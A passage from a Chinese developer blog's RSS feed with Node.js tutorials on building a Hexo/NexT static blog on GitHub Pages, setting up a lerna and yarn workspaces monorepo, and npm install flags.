<h2 id="拓展配置" tabindex="-1"> 拓展配置</h2>
<h3 id="ghost-邮件系统设置详解" tabindex="-1"> Ghost 邮件系统设置详解</h3>
<p><a href="http://www.ghostchina.com/mail-configuration-on-self-hosted-version-of-ghost/" target="_blank" rel="noopener noreferrer">Ghost 邮件系统设置详解</a></p>
<h3 id="为博客增加-标签云" tabindex="-1"> 为博客增加 &quot;标签云&quot;</h3>
<p><a href="http://www.ghostchina.com/output-tag-cloud/" target="_blank" rel="noopener noreferrer">为博客增加 &quot;标签云&quot;</a></p>
]]></content:encoded>
    </item>
    <item>
      <title>使用 Hexo+NexT 在 Github 上搭建静态博客</title>
      <link>https://vxhly.github.io/views/nodejs/install-hexo-next-on-github.html</link>
      <guid>https://vxhly.github.io/views/nodejs/install-hexo-next-on-github.html</guid>
      <source url="https://vxhly.github.io/rss.xml">使用 Hexo+NexT 在 Github 上搭建静态博客</source>
      <description>前言
Hexo 是一个快速, 简单而高效的静态博客框架, 本文将介绍如何在 GitHub 上使用 Hexo+NexT 搭建静态博客。

</description>
      <category>nodejs</category>
      <pubDate>Wed, 03 Aug 2016 13:11:30 GMT</pubDate>
      <content:encoded><![CDATA[<div><p>前言</p>
<p>Hexo 是一个快速, 简单而高效的静态博客框架, 本文将介绍如何在 GitHub 上使用 Hexo+NexT 搭建静态博客。</p>
</div>

<h2 id="准备" tabindex="-1"> 准备</h2>
<div><p>提示</p>
<p>你需要在 <a href="http://github.com/" target="_blank" rel="noopener noreferrer">Github</a> 上创建一个属于自己的账户, 然后新建一个仓库（new repository）, 并命名为 YourSiteName.github.io, 此时 Github 会帮助你初始化一个静态网页, 你可以根据自己的喜好选择一些模版（这都不是重点）, 接着尝试访问下你所建的站点, 成功后就可以开始动工了。</p>
</div>
<h3 id="node-js-环境" tabindex="-1"> Node.js 环境</h3>
<p>需安装 nvm, 任何版本皆可</p>
<div><pre><code>nvm <span>5</span>
nvm <span>alias</span> defaults <span>5</span>
</code></pre><div aria-hidden="true"><div></div><div></div></div></div><h3 id="安装-git" tabindex="-1"> 安装 Git</h3>
<p>如果你的系统没有 git, 则必装</p>
<div><pre><code><span>sudo</span> <span>apt-get</span> <span>install</span> <span>git</span>
</code></pre><div aria-hidden="true"><div></div></div></div><h2 id="hexo-初始化博客框架" tabindex="-1"> Hexo 初始化博客框架</h2>
<div><p>提示</p>
<p>参考链接<br> <a href="http://hexo.io/zh-cn/" target="_blank" rel="noopener noreferrer">Hexo 官网</a><br> <a href="http://hexo.io/zh-cn/docs/" target="_blank" rel="noopener noreferrer">Hexo 配置文档</a><br> <a href="http://hexo.io/zh-cn/docs/commands.html" target="_blank" rel="noopener noreferrer">Hexo 相关指令</a><br> <a href="http://github.com/hexojs/hexo/wiki/Themes" target="_blank" rel="noopener noreferrer">Hexo 主题</a></p>
</div>
<h3 id="安装-hexo" tabindex="-1"> 安装 Hexo</h3>
<div><pre><code><span>npm</span> <span>install</span> -g hexo-cli
</code></pre><div aria-hidden="true"><div></div></div></div><h3 id="初始化框架" tabindex="-1"> 初始化框架</h3>
<div><pre><code>hexo init <span>[</span>yourFolder<span>]</span>
<span>cd</span> <span>[</span>folderName<span>]</span>
<span>npm</span> <span>install</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div></div></div><h4 id="新建文章" tabindex="-1"> 新建文章</h4>
<div><pre><code>hexo new <span>"Hello World"</span>
</code></pre><div aria-hidden="true"><div></div></div></div><p>在 <code>./source/_post</code> 里添加 <code>hello-world.md</code> 文件, 之后新建的文章都将存放在此目录下。</p>
<h4 id="新建页面" tabindex="-1"> 新建页面</h4>
<div><pre><code>hexo new page tags
hexo new page categories
</code></pre><div aria-hidden="true"><div></div><div></div></div></div><p>在 <code>./source/</code> 里添加 <code>tags</code> 和 <code>categories</code> 目录, 即标签页和分类页</p>
<h4 id="取消标签页和分类页的评论功能" tabindex="-1"> 取消标签页和分类页的评论功能</h4>
<p>标签页 <code>./source/categories/index.md</code></p>
<div><pre><code><span><span>---</span>
<span><span>title</span><span>:</span> <span>null</span>
<span>date</span><span>:</span>
<span>type</span><span>:</span> <span>"categories"</span>
<span>comments</span><span>:</span> <span>false</span></span>
<span>---</span></span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p>分类页 <code>./source/tags/index.md</code></p>
<div><pre><code><span><span>---</span>
<span><span>title</span><span>:</span> <span>null</span>
<span>date</span><span>:</span>
<span>type</span><span>:</span> <span>"tags"</span>
<span>comments</span><span>:</span> <span>false</span></span>
<span>---</span></span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h4 id="建议修改默认的文章模板" tabindex="-1"> 建议修改默认的文章模板</h4>
<div><pre><code><span>vim</span> ./scaffolds/post.md
</code></pre><div aria-hidden="true"><div></div></div></div><p>修改成</p>
<div><pre><code><span><span>---</span>
<span><span>title</span><span>:</span> <span>{</span> <span>{</span> title <span>}</span> <span>}</span>
<span>date</span><span>:</span> <span>{</span> <span>{</span> date <span>}</span> <span>}</span>

<span>categories</span><span>:</span>
tags<span>:</span></span>
<span>---</span></span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id="生成静态网站" tabindex="-1"> 生成静态网站</h3>
<div><pre><code>hexo generate
</code></pre><div aria-hidden="true"><div></div></div></div><p>此时会将 <code>/source</code> 的 <code>.md</code> 文件生成 <code>html</code> 文件到 <code>/public</code> 中, 形成网站的静态文件。</p>
<h3 id="本地预览" tabindex="-1"> 本地预览</h3>
<div><pre><code>hexo server -p <span>3000</span>
</code></pre><div aria-hidden="true"><div></div></div></div><p>输入 <code>//localhost:3000</code> 即可查看网站, 若无指定端口号, 将采用默认端口 <code>4000</code> 。 使用 <code>Ctrl + C</code> 快捷键终止该进程</p>
<h3 id="部署网站至-github" tabindex="-1"> 部署网站至 github</h3>
<div><pre><code>hexo deploy
</code></pre><div aria-hidden="true"><div></div></div></div><h4 id="静态化且部署简化命令" tabindex="-1"> 静态化且部署简化命令</h4>
<div><pre><code>hexo g -d
</code></pre><div aria-hidden="true"><div></div></div></div><h4 id="部署网站前请配置" tabindex="-1"> 部署网站前请配置</h4>
<p><code>./_config.yml</code></p>
<div><pre><code><span>deploy</span><span>:</span>
    <span>type</span><span>:</span> git
<span>repo</span><span>:</span> <span>git @github.com</span><span>:</span> youName / youName.github.io.git
<span>branch</span><span>:</span> master
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div></div></div><h4 id="部署前请执行" tabindex="-1"> 部署前请执行</h4>
<div><pre><code><span>npm</span> <span>install</span> hexo-deployer-git --save
hexo clean
hexo generate
</code></pre><div aria-hidden="true"><div></div><div></div><div></div></div></div><h2 id="使用-next-主题让站点更酷炫" tabindex="-1"> 使用 NexT 主题让站点更酷炫</h2>
<div><p>提示</p>
<p>参考链接<br> <a href="http://theme-next.iissnan.com/" target="_blank" rel="noopener noreferrer">NexT 参考文档</a><br> <a href="http://theme-next.iissnan.com/theme-settings.html" target="_blank" rel="noopener noreferrer">NexT 主题配置</a><br> <a href="http://theme-next.iissnan.com/third-party-services.html" target="_blank" rel="noopener noreferrer">NexT 第三方服务</a><br> <a href="http://theme-next.iissnan.com/faqs.html" target="_blank" rel="noopener noreferrer">更多的配置问题</a></p>
</div>
<h3 id="下载主题" tabindex="-1"> 下载主题</h3>
<div><pre><code><span>cd</span> <span>&lt;</span>yourFolder<span>></span>
<span>git</span> clone https://github.com/iissnan/hexo-theme-next themes/next
</code></pre><div aria-hidden="true"><div></div><div></div></div></div><h3 id="修改配置文件" tabindex="-1"> 修改配置文件</h3>
<div><pre><code><span>vim</span> ./_config.yml
</code></pre><div aria-hidden="true"><div></div></div></div><p>修改</p>
<div><pre><code>theme: next
</code></pre><div aria-hidden="true"><div></div></div></div><h3 id="验证主题效果" tabindex="-1"> 验证主题效果</h3>
<div><pre><code>hexo s --debug
</code></pre><div aria-hidden="true"><div></div></div></div><p>访问 <code>//localhost:4000</code> , 确保站点正确运行</p>
<h2 id="站内搜索" tabindex="-1"> 站内搜索</h2>
<h3 id="安装-hexo-generator-search" tabindex="-1"> 安装 hexo-generator-search</h3>
<div><pre><code><span>npm</span> <span>install</span> hexo-generator-search --save
</code></pre><div aria-hidden="true"><div></div></div></div><h3 id="编辑配置文件" tabindex="-1"> 编辑配置文件</h3>
<p><code>./_config.yml</code></p>
<p>在任意位置添加以下内容</p>
<div><pre><code><span>search</span><span>:</span>
  <span>path</span><span>:</span> search.xml
<span>field</span><span>:</span> post
<span>format</span><span>:</span> html
<span>limit</span><span>:</span> <span>10000</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div></div></div><h3 id="编辑主题配置文件" tabindex="-1"> 编辑主题配置文件</h3>
<p><code>./themes/next/_config.yml</code></p>
<div><pre><code><span>#</span>
Local search
<span>local_search</span><span>:</span>
    <span>enable</span><span>:</span> <span>true</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div></div></div><h2 id="开启字数统计和阅读时长" tabindex="-1"> 开启字数统计和阅读时长</h2>
<h3 id="安装-hexo-wordcount" tabindex="-1"> 安装 hexo-wordcount</h3>
<div><pre><code><span>npm</span> <span>install</span> hexo-wordcount --save
</code></pre><div aria-hidden="true"><div></div></div></div><h3 id="编辑主题配置文件-1" tabindex="-1"> 编辑主题配置文件</h3>
<p><code>./themes/next/_config.yml</code></p>
<div><pre><code><span>post_wordcount</span><span>:</span>
  <span>item_text</span><span>:</span> <span>true</span>
<span>wordcount</span><span>:</span> <span>true</span>
<span>min2read</span><span>:</span> <span>true</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div></div></div><h1 id="我的配置-只写出部分配置" tabindex="-1"> 我的配置（只写出部分配置）</h1>
<h2 id="站点配置文件" tabindex="-1"> 站点配置文件</h2>
<p><code>./_config.yml</code></p>
<div><pre><code><span>#</span>
Site
<span>language</span><span>:</span> zh <span>-</span> Hans

<span># search</span>
<span>search</span><span>:</span>
    <span>path</span><span>:</span> search.xml
<span>field</span><span>:</span> post

<span># URL</span>
<span>url</span><span>:</span> . /

    <span>#Writing</span>
<span>highlight</span><span>:</span>
    <span>enable</span><span>:</span> <span>true</span>
<span>line_number</span><span>:</span> <span>true</span>
<span>auto_detect</span><span>:</span> <span>true</span>
<span>tab_replace</span><span>:</span>

    <span>#Pagination</span>
<span>per_page</span><span>:</span> <span>5</span>
<span>pagination_dir</span><span>:</span> page

<span># Extensions</span>
<span>theme</span><span>:</span> next

<span># Deployment</span>
<span>deploy</span><span>:</span>
    <span>type</span><span>:</span> git
<span>repo</span><span>:</span> <span>git @github.com</span><span>:</span> vxhly / vxhly.github.io.git
<span>branch</span><span>:</span> master
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h2 id="主题配置文件文件" tabindex="-1"> 主题配置文件文件</h2>
<p><code>./themes/next/_config.yml</code></p>
<div><pre><code><span># Specify the date when the site was setup</span>
<span>since</span><span>:</span> <span>2016</span>

<span># Footer `powered-by` and `theme-info` copyright</span>
<span>copyright</span><span>:</span> <span>true</span>

<span>menu</span><span>:</span>
  <span>home</span><span>:</span> /
  <span>category</span><span>:</span> /categories
  <span>#about: /about</span>
  <span>archives</span><span>:</span> /archives
  <span>tags</span><span>:</span> /tags
  <span>#sitemap: /sitemap.xml</span>
  <span>commonweal</span><span>:</span> /404.html

<span># Schemes</span>
<span>#scheme: Muse</span>
<span>scheme</span><span>:</span> Mist
<span>#scheme: Pisces</span>

<span># Social Links</span>
<span>social</span><span>:</span>
  <span>#LinkLabel: Link</span>
  <span>GitHub</span><span>:</span> //github.com/vxhly
  <span>Weibo</span><span>:</span> //weibo.com/5039312152

<span># Automatically scroll page to section which is under &lt;!-- more --> mark.</span>
<span>scroll_to_more</span><span>:</span> <span>true</span>

<span># Automatically Excerpt. Not recommand.</span>
<span>auto_excerpt</span><span>:</span>
  <span>enable</span><span>:</span> <span>true</span>
  <span>length</span><span>:</span> <span>150</span>

<span># Code Highlight theme</span>
<span>highlight_theme</span><span>:</span> night eighties

<span># Duoshuo ShortName</span>
<span>duoshuo_shortname</span><span>:</span> vxhly
  <span>enable</span><span>:</span> <span>true</span>
  <span>length</span><span>:</span> <span>150</span>

<span># Post wordcount display settings</span>
<span>post_wordcount</span><span>:</span>

    <span>item_text</span><span>:</span> <span>true</span>

<span>wordcount</span><span>:</span> <span>true</span>
<span>min2read</span><span>:</span> <span>true</span>

<span># Share</span>
<span>duoshuo_share</span><span>:</span> <span>true</span>

<span># Make duoshuo show UA</span>
<span>duoshuo_info</span><span>:</span>
  <span>ua_enable</span><span>:</span> <span>true</span>
  <span>admin_enable</span><span>:</span> <span>true</span>
  <span>user_id</span><span>:</span> <span>13846473</span>
  <span>admin_nickname</span><span>:</span> Author
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h2 id="腾讯公益-404-页面" tabindex="-1"> 腾讯公益 404 页面</h2>
<p><code>./themes/next/source/404.html</code></p>
<div><pre><code><span><span>&lt;!</span><span>DOCTYPE</span> <span>html</span><span>></span></span>
<span><span><span>&lt;</span>html</span><span>></span></span>
  <span><span><span>&lt;</span>head</span><span>></span></span>
    <span><span><span>&lt;</span>meta</span> <span>http-equiv</span><span><span>=</span><span>"</span>content-type<span>"</span></span> <span>content</span><span><span>=</span><span>"</span>text/html;charset=utf-8;<span>"</span></span> <span>/></span></span>
    <span><span><span>&lt;</span>meta</span> <span>http-equiv</span><span><span>=</span><span>"</span>X-UA-Compatible<span>"</span></span> <span>content</span><span><span>=</span><span>"</span>IE=edge,chrome=1<span>"</span></span> <span>/></span></span>
    <span><span><span>&lt;</span>meta</span> <span>name</span><span><span>=</span><span>"</span>robots<span>"</span></span> <span>content</span><span><span>=</span><span>"</span>all<span>"</span></span> <span>/></span></span>
    <span><span><span>&lt;</span>meta</span> <span>name</span><span><span>=</span><span>"</span>robots<span>"</span></span> <span>content</span><span><span>=</span><span>"</span>index,follow<span>"</span></span> <span>/></span></span>
  <span><span><span>&lt;/</span>head</span><span>></span></span>

  <span><span><span>&lt;</span>body</span><span>></span></span>
    <span><span><span>&lt;</span>script</span>
      <span>type</span><span><span>=</span><span>"</span>text/javascript<span>"</span></span>
      <span>src</span><span><span>=</span><span>"</span>//www.qq.com/404/search_children.js<span>"</span></span>
      <span>charset</span><span><span>=</span><span>"</span>utf-8<span>"</span></span>
      <span>homePageUrl</span><span><span>=</span><span>"</span>/<span>"</span></span>
      <span>homePageName</span><span><span>=</span><span>"</span>回到我的主页<span>"</span></span>
    <span>></span></span><span></span><span><span><span>&lt;/</span>script</span><span>></span></span>
  <span><span><span>&lt;/</span>body</span><span>></span></span>
<span><span><span>&lt;/</span>html</span><span>></span></span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div>]]></content:encoded>
    </item>
    <item>
      <title>基于 lerna + yarn workspaces 的 monorepo 项目实践</title>
      <link>https://vxhly.github.io/views/nodejs/learning-lerna-and-yarn-worspaces.html</link>
      <guid>https://vxhly.github.io/views/nodejs/learning-lerna-and-yarn-worspaces.html</guid>
      <source url="https://vxhly.github.io/rss.xml">基于 lerna + yarn workspaces 的 monorepo 项目实践</source>
      <description>前言
观察到 GitHub 上面有很多的开源项目使用到了 lerna 和 yarn workspaces 来管理项目中的多包依赖, 好奇起它的实现过程, 于是便写下本篇博文来记录我的填坑过程。

</description>
      <category>nodejs</category>
      <pubDate>Mon, 26 Oct 2020 12:13:34 GMT</pubDate>
      <content:encoded><![CDATA[<div><p>前言</p>
<p>观察到 GitHub 上面有很多的开源项目使用到了 lerna 和 yarn workspaces 来管理项目中的多包依赖, 好奇起它的实现过程, 于是便写下本篇博文来记录我的填坑过程。</p>
</div>

<h2 id="参考资料" tabindex="-1"> 参考资料</h2>
<p>先贴上我的参考资料来源</p>
<ol>
<li>lerna 官网: <a href="https://lerna.js.org/" target="_blank" rel="noopener noreferrer">lerna.js.org/</a></li>
<li>lerna 仓库：<a href="https://github.com/lerna/lerna/" target="_blank" rel="noopener noreferrer">github.com/lerna/lerna/</a></li>
<li>yarn workspaces：<a href="https://classic.yarnpkg.com/zh-Hans/docs/workspaces" target="_blank" rel="noopener noreferrer">classic.yarnpkg.com/zh-Hans/docs/workspaces/</a></li>
</ol>
<p>当然也得感谢前人栽的树</p>
<ol>
<li><a href="https://juejin.im/post/6844903954329894920" target="_blank" rel="noopener noreferrer">Lerna 多包管理的搭建指南</a></li>
<li><a href="https://www.jianshu.com/p/8b7e6025354b" target="_blank" rel="noopener noreferrer">lerna 的基础使用</a></li>
</ol>
<h2 id="背景" tabindex="-1"> 背景</h2>
<p>团队内多项目开发经常会遇到以下几个问题</p>
<ol>
<li>新建项目需要重新配置各种工具, 繁琐, 虽然也可以用脚手架生成, 但后期涉及到依赖的升级也麻烦</li>
<li>项目内的依赖互相引用虽然有 yarn/npm link, 但还是影响开发体验</li>
<li>babel 等配置希望可以多项目共享</li>
</ol>
<h3 id="前端开发-package-面临的问题" tabindex="-1"> 前端开发 package 面临的问题</h3>
<p>在最初开开发 package 的时候, 还属于一种刀耕火种的阶段。没有什么自动化的工具。发布 package 的时候, 都是手动修改版本号(PS: 当然也可以通过脚本工具来升级版本号)。如果 packages 数量不多还可以接受。但是当数量逐渐增多的时候, 且这些 packages 之间还有依赖关系的时候, 在版本号上的管理无法形成统一, 这就对开发人员来说就很痛苦了。工作不仅繁琐, 而且需要用掉不少时间。</p>
<p>举个例子, 如果你要维护两个 package。分别为 module-1, module-2。</p>
<p>下面是这两个 package 的依赖关系。</p>
<div><pre><code><span>// module-1 package.json</span>
<span>{</span>
  <span>"name"</span><span>:</span> <span>"module-1"</span><span>,</span>
  <span>"version"</span><span>:</span> <span>"1.0.0"</span><span>,</span>
  <span>"dependencies"</span><span>:</span> <span>{</span>
    <span>"module-2"</span><span>:</span> <span>"^1.0.0"</span>
  <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><div><pre><code><span>// module-2 package.json</span>
<span>{</span>
  <span>"name"</span><span>:</span> <span>"module-2"</span><span>,</span>
  <span>"version"</span><span>:</span> <span>"1.0.0"</span>
<span>}</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div></div></div><p>在这样的环境下, module-1 是依赖 module-2 的。如果 module-2 有修改, 需要发布。那么你的工作有这些。</p>
<p>修改 module-2 版本号, 发布。修改 module-1 的依赖关系, 修改 module-1 的版本号, 发布。</p>
<p>这还仅仅只有两个 package, 如果依赖关系更复杂, 大家可以想想发布的工作量有多大。</p>
<h2 id="什么是-lernajs" tabindex="-1"> 什么是 lernaJs</h2>
<p>lernaJs 是由 Babel 团队出的一个多包管理工具, 是 GitHub 上面开源的一款 js 代码库管理软件, 用来对一系列相互耦合比较大、又相互独立的 js git 库进行管理。因为 Babel 包含很多子包, 以前都是放在多个仓库里的, 管理比较困难, 特别是有调用系统内包的时候, 发布比较麻烦。所以为了能更好更快的跨包管理, babel 推出了 lernaJs, 使用了 monorepo 的概念, 现在 React,Babel,Angular,Jest 都在使用这个工具来管理包。</p>
<p>对于一些功能比较全的库, 我们往往会把各个小功能拆分成独立的 npm 库, 他们直接有比较强的依赖关系。可以解决各个库之间修改混乱、难以跟踪的问题。lerna 可以优化这种情形下的工作流。</p>
<h2 id="什么是-yarn-workspaces" tabindex="-1"> 什么是 yarn workspaces</h2>
<p>Workspace 能更好的统一管理有多个项目的仓库, 既可在每个项目下使用独立的 package.json 管理依赖, 又可便利的享受一条 yarn 命令安装或者升级所有依赖等。更重要的是可以使多个项目共享同一个 node_modules 目录, 提升开发效率和降低磁盘空间占用。一句话总结就是可以大大简化对多个项目的统一管理。很多知名的开源项目也使用了 Yarn Workspace, 如 vue、react、jest 等使用 lerna 结合 yarn workspaces 各个 package 理论上都是独立的, 所以每个 package 都维护着自己的 dependencies, 而很大的可能性, package 之间有不少相同的依赖, 而这就可能使 install 时出现重复安装, 使本来就很大的 node_modues 继续膨胀。简单的说如果不使用 yarn workspaces 的话, 会导致在安装依赖时, 子包重复安装依赖项。使用 yarn workspaces 时, 我们就可以将这些依赖提至到工作根区。</p>
<h3 id="代码库结构" tabindex="-1"> 代码库结构</h3>
<p>lerna 管理的库文件结构类似如下这样</p>
<div><pre><code>my-lerna-repo
  |
  |- packages
  |    |
  |    |- package-1
  |    |    |
  |    |    └─ package.json
  |    |
  |    └─ package-2
  |         |
  |         └─ package.json
  |
  |- package.json
  |
  └─ lerna.json
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id="lerna-主要做了什么" tabindex="-1"> lerna 主要做了什么</h3>
<ol>
<li>通过 lerna 的命令 <code>lerna bootstrap</code> 将会把代码库进行 link。</li>
<li>通过 <code>lerna publish</code> 发布最新改动的库</li>
</ol>
<h3 id="lerna-的更多知识" tabindex="-1"> lerna 的更多知识</h3>
<div><p>提示</p>
<p>这边不多阐述 lerna 的相关命令以及其的相关知识点, 有兴趣的贴上地址 <a href="/views/nodejs/usage-lerna.html">lerna 的使用指南</a></p>
</div>
<h2 id="什么是-monorepo" tabindex="-1"> 什么是 monorepo</h2>
<p>monorepo 是比较于 multi-package 的。multi-package 就是建立多个仓库, 每个包建立一个仓库。而 monorepo 是建立一个仓库, 多个包都在这个仓库中管理, 这样可以有两个好处：</p>
<ol>
<li>各个包之间的沟通更加的方便, 如果 multi-package 的话, 系统内其中一个包修改, 需要单独发版, 而且引用这个包的其他包都需要发版。使用 lerna 的话可以自动管理这些包的发版, 很方便。</li>
<li>一些可以共用的配置, 比如 eslint,babel,rollup 等, 可以统一的管理这些开发配置。</li>
</ol>
<h2 id="代码库的结构" tabindex="-1"> 代码库的结构</h2>
<div><p>提示</p>
<p>这边节选 <a href="https://github.com/vuejs/vue-next" target="_blank" rel="noopener noreferrer">vue-next</a> 的项目结构来讲解实现过程贴上我已经实现好的 <a href="https://github.com/vxhly/my-lerna-repo" target="_blank" rel="noopener noreferrer">my-lerna-repo</a></p>
</div>
<p>创建目录结构如下</p>
<div><pre><code>my-lerna-repo
  |
  |- packages
  |
  |- package.json
  |
  └─ lerna.json
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p>当然你也可以通过 <code>lerna</code> 的命令来创建</p>
<div><pre><code>lerna init my-lerna-repo
</code></pre><div aria-hidden="true"><div></div></div></div><p>修改你的 <code>lerna.json</code> 来支持 yarn workspaces</p>
<div><pre><code><span>{</span>
  <span>"npmClient"</span><span>:</span> <span>"yarn"</span><span>,</span>
  <span>"packages"</span><span>:</span> <span>[</span><span>"packages/*"</span><span>]</span><span>,</span>
  <span>"version"</span><span>:</span> <span>"1.0.0"</span><span>,</span>
  <span>"useWorkspaces"</span><span>:</span> <span>true</span>
<span>}</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p>还需要在 <code>package.json</code> 中添加以下配置来开启 yarn workspaces</p>
<div><pre><code><span>{</span>
  <span>"private"</span><span>:</span> <span>true</span><span>,</span>
  <span>"workspaces"</span><span>:</span> <span>[</span><span>"packages/*"</span><span>]</span>
<span>}</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div></div></div><p>接着就是安装依赖项, 你可以通过以下命令来安装</p>
<div><pre><code>lerna bootstrap
</code></pre><div aria-hidden="true"><div></div></div></div>]]></content:encoded>
    </item>
    <item>
      <title>浅谈 Node.js 中的 npm</title>
      <link>https://vxhly.github.io/views/nodejs/talk-npm-on-node-js.html</link>
      <guid>https://vxhly.github.io/views/nodejs/talk-npm-on-node-js.html</guid>
      <source url="https://vxhly.github.io/rss.xml">浅谈 Node.js 中的 npm</source>
      <description>前言
主要介绍 npm 中的各个选项的作用以及其区别。npm 依赖于 Node.js, 童鞋们要注意你的系统是否有 Node.js 环境。

</description>
      <category>nodejs</category>
      <pubDate>Fri, 26 Aug 2016 15:30:10 GMT</pubDate>
      <content:encoded><![CDATA[<div><p>前言</p>
<p>主要介绍 npm 中的各个选项的作用以及其区别。npm 依赖于 Node.js, 童鞋们要注意你的系统是否有 Node.js 环境。</p>
</div>

<h2 id="npm-是什么" tabindex="-1"> npm 是什么</h2>
<div><p>简介</p>
<p>NPM 的全称是 Node Package Manager, 是随同 Node.js 一起安装的包管理和分发工具, 它很方便让 JavaScript 开发者下载、安装、上传以及管理已经安装的包。</p>
</div>
<h2 id="npm-install-安装模块" tabindex="-1"> npm install 安装模块</h2>
<div><p>提示</p>
<p>安装包, 默认会安装最新的版本, 最后所有的依赖会存放在 <code>node_modules</code> 目录下的, 如:</p>
</div>
<div><pre><code>$ <span>npm</span> <span>install</span> gulp
</code></pre><div aria-hidden="true"><div></div></div></div><h3 id="全局安装" tabindex="-1"> 全局安装</h3>
<div><p>提示</p>
<p>只需加上 <code>-g</code> 或者 <code>--global</code> 参数, 就可以实现全局安装, 如:</p>
</div>
<div><pre><code>$ <span>npm</span> <span>install</span> gulp -g
</code></pre><div aria-hidden="true"><div></div></div></div><h3 id="安装指定版本" tabindex="-1"> 安装指定版本</h3>
<div><pre><code>$ <span>npm</span> <span>install</span> gulp@3.9.1
</code></pre><div aria-hidden="true"><div></div></div></div><h2 id="s-save" tabindex="-1"> -S, --save</h2>
<h3 id="添加模块命令" tabindex="-1"> 添加模块命令</h3>
<div><pre><code>$ <span>npm</span> <span>install</span> <span>[</span>module-name<span>]</span> --save
$ <span>npm</span> <span>install</span> <span>[</span>module-name<span>]</span> -S
</code></pre><div aria-hidden="true"><div></div><div></div></div></div><h3 id="作用" tabindex="-1"> 作用</h3>
<div><p>作用</p>
<p>自动把模块和版本号添加至 <code>package.json</code> 的 <code>dependencies</code> （生产阶段的依赖）部分, 避免了手动添加。</p>
</div>
<p><code>package.json</code> 文件的 <code>dependencies</code> 字段:</p>
<div><pre><code><span>"dependencies"</span><span>:</span> <span>{</span>
  <span>"[module-name]"</span><span>:</span> <span>"^[version]"</span>
<span>}</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div></div></div><h2 id="d-save-dev" tabindex="-1"> -D, --save-dev</h2>
<h3 id="添加模块命令-1" tabindex="-1"> 添加模块命令</h3>
<div><pre><code>$ <span>npm</span> <span>install</span> <span>[</span>module-name<span>]</span> --save-dev
$ <span>npm</span> <span>install</span> <span>[</span>module-name<span>]</span> -D
</code></pre><div aria-hidden="true"><div></div><div></div></div></div><h3 id="作用-1" tabindex="-1"> 作用</h3>
<div><p>作用</p>
<p>自动把模块和版本号添加至 <code>package.json</code> 的 <code>devDependencies</code> （开发阶段的依赖）部分, 避免了手动添加。</p>
</div>
<p><code>package.json</code> 文件的 <code>devDependencies</code> 字段:</p>
<div><pre><code><span>"devDependencies"</span><span>:</span> <span>{</span>
  <span>"[module-name]"</span><span>:</span> <span>"^[version]"</span>
<span>}</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div></div></div><h2 id="o-save-optional" tabindex="-1"> -O, --save-optional</h2>
<h3 id="添加模块命令-2" tabindex="-1"> 添加模块命令</h3>
<div><pre><code>$ <span>npm</span> <span>install</span> <span>[</span>module-name<span>]</span> --save-optional
$ <span>npm</span> <span>install</span> <span>[</span>module-name<span>]</span> -O
</code></pre><div aria-hidden="true"><div></div><div></div></div></div><h3 id="作用-2" tabindex="-1"> 作用</h3>
<div><p>作用</p>
<p>自动把模块和版本号添加至 <code>package.json</code> 的 <code>optionalDependencies</code> （可选阶段的依赖）部分, 避免了手动添加。</p>
</div>
<p><code>package.json</code> 文件的 <code>optionalDependencies</code> 字段:</p>
<div><pre><code><span>"optionalDependencies"</span><span>:</span> <span>{</span>
  <span>"[module-name]"</span><span>:</span> <span>"^[version]"</span>
<span>}</span><span>,</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div></div></div><h2 id="e-save-exact" tabindex="-1"> -E, --save-exact</h2>
<h3 id="添加模块命令-3" tabindex="-1"> 添加模块命令</h3>
<div><pre><code>$ <span>npm</span> <span>install</span> <span>[</span>module-name<span>]</span> --save-exact
$ <span>npm</span> <span>install</span> <span>[</span>module-name<span>]</span> -E
</code></pre><div aria-hidden="true"><div></div><div></div></div></div><h3 id="作用-3" tabindex="-1"> 作用</h3>
<div><p>作用</p>
<p>自动把模块和版本号添加至 <code>package.json</code> 的 <code>dependencies</code> （精确安装指定模块版本）部分, 避免了手动添加。需要注意的是: <code>package.json</code> 文件的 <code>dependencies</code> 字段, 版本号中的 <code>^</code> 消失了</p>
</div>
<p><code>package.json</code> 文件的 <code>dependencies</code> 字段</p>
<div><pre><code><span>"dependencies"</span><span>:</span> <span>{</span>
  <span>"[module-name]"</span><span>:</span> <span>"[version]"</span>
<span>}</span>
